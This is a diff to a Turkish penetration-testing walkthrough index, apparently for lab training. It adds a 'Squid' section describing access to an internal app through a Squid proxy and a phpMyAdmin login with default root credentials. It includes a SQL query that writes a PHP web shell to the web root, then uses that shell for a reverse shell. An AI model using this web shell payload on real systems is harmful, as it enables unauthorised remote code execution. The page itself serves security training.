@@ -43,6 +43,7 @@ Orta düzeyde sistem bilgisine sahip takımlar için:
 | Walkthrough | Konu | Zorluk |
 |------------|------|--------|
 | [Internal - MS09-050 Exploitation](/internal/) | Windows SMB Exploitation | 🟡 Orta |
+| [Squid - phpMyAdmin RCE](/squid/) | Squid proxy uygulaması üzerinden phpMyAdmin RCE | 🟡 Orta |
 | TBD | Active Directory Lateral Movement | 🟡 Orta |
 | TBD | Kerberos Exploitation | 🟡 Orta |
 | TBD | Living off the Land (LOLBins) | 🟡 Orta |
@@ -72,6 +73,26 @@ Derinlemesine sistem bilgisine sahip takımlar için:
 - `.\SharpHound.exe -CollectionMethod All` çalıştırıldı.
 - Generic All yetkisi gözlemlendi.
 - RBCD exploit adımları için [RBCD exploitation](/rbcd-exploitation/) sayfasına bakın.
+
+---
+
+## Squid
+
+- `spose.py` ile tarama yapıldı.
+- 8080 ve 3306 portları açık olduğu gözlemlendi.
+- 8080 portuna erişmek için FoxyProxy veya benzeri bir proxy aracıyla 3128 üzerinden Squid ayarlandı.
+- 8080 portundaki uygulamaya erişildi.
+- phpMyAdmin'e default `root:` kimlik bilgisiyle giriş yapıldı.
+- phpMyAdmin içinde SQL menüsüne aşağıdaki sorgu çalıştırıldı:
+
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\shell.php"
+```
+
+- Oluşturulan `shell.php` dosyasına `?cmd=<komut>` ile erişildi.
+- Örneğin: `shell.php?cmd=REVSHELL_POWERHELL4`
+- Bu sayede sistemde RCE ile reverse shell elde edildi.
+
 
 ---
 
